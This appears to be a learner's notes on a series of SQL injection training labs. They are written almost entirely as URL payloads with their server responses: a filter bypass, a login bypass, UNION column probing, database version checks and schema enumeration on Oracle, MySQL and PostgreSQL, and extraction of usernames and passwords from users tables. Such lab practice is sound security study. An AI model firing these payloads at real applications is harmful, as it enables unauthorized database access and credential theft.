# SQLi

## Retrieving hidden data

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```
/filter?category=Food+%26+Drink'+OR+1=1--
```

## Subverting application logic

### SQL injection vulnerability allowing login bypass

Username: `administrator'--`

## Retrieving data from other database tables

### Determining the number of columns required in an SQL injection UNION attack
```
?category=Gifts'+UNION+SELECT+null--            500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,null--       500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,null,null--  200 OK
```

### Finding columns with a useful data type in an SQL injection UNION attack
```
?category=Gifts'+UNION+SELECT+'rn4IRy',null,null--   500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,'rn4IRy',null--   200 OK
```

### Using an SQL injection UNION attack to retrieve interesting data
```
?category=Pets'+UNION+SELECT+username,password+FROM+users--
```
Credentials retrieved: `administrator` / `sip8ds`

### Retrieving multiple values within a single column
```
?category=Gifts'+UNION+SELECT+null,username+||+'~'+||+password+FROM+users--

wiener~peter
administrator~5v82nt
carlos~montoya
```

## Examining the database

### SQL injection attack, querying the database type and version on Oracle
```
?category=Gifts'+UNION+SELECT+BANNER,null+FROM+v$version--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft
```
?category=Lifestyle'+UNION+SELECT+null,@@version--+
```

### SQL injection attack, listing the database contents on non-Oracle databases
```
?category=Gifts%27+UNION+SELECT+version(),null--+
PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

?category=Gifts%27+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables--+
public / users_xsxvki

?category=Gifts%27+UNION+SELECT+null,COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name=%27users_xsxvki%27--+
username_difdky
password_gjwzbs

?category=Gifts%27+UNION+SELECT+username_difdky,password_gjwzbs+FROM+users_xsxvki--+
administrator / niuv95
```

### SQL injection attack, listing the database contents on Oracle
```
https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286
?category=Gifts%27+UNION+SELECT+null,TABLE_NAME+FROM+all_tables--
USERS_TUEJNQ

https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2094.htm
?category=Gifts%27+UNION+SELECT+null,COLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME=%27USERS_TUEJNQ%27--
USERNAME_GIBQLT
PASSWORD_EZJBQY

?category=Gifts%27+UNION+SELECT+USERNAME_GIBQLT,PASSWORD_EZJBQY+FROM+USERS_TUEJNQ--+
administrator / lpm52k
```